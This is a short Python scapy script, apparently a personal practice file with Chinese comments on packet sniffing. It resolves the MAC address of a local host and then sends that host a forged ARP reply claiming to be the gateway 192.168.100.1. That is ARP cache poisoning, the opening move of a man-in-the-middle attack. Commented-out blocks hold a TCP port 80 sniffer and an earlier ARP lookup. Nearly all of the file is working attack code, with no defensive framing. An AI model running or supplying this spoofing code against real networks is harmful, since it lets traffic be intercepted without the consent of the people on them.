from scapy.all import *

'''
def packet_callback(packet):
    print(packet['TCP'].show())
# filter参数用于指定过滤器
# iface用于设置嗅探器的网卡
# prn指定嗅探到符合过滤器条件的数据包时所调用的回调函数
# count用于指定嗅探的数据包个数
# store指定不在内存当中保留原始数据包
sniff(filter="tcp port 80", iface="WLAN 2", prn=packet_callback, count=1, store=0)
'''

'''
response, unanswered =srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.100.196"), timeout=2, verbose=0)
for s, r in response:
    print(r['ARP'].hwsrc)
    target_mac = r[ARP].hwsrc
'''
response, unanswered =srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.100.7"), timeout=2, verbose=0)
for s, r in response:
    target_mac = r['ARP'].hwsrc

target = ARP()
target.psrc = '192.168.100.1'
target.pdst = '192.168.100.7'
target.hwdst = target_mac
target.op = 2
target.show()
send(target)
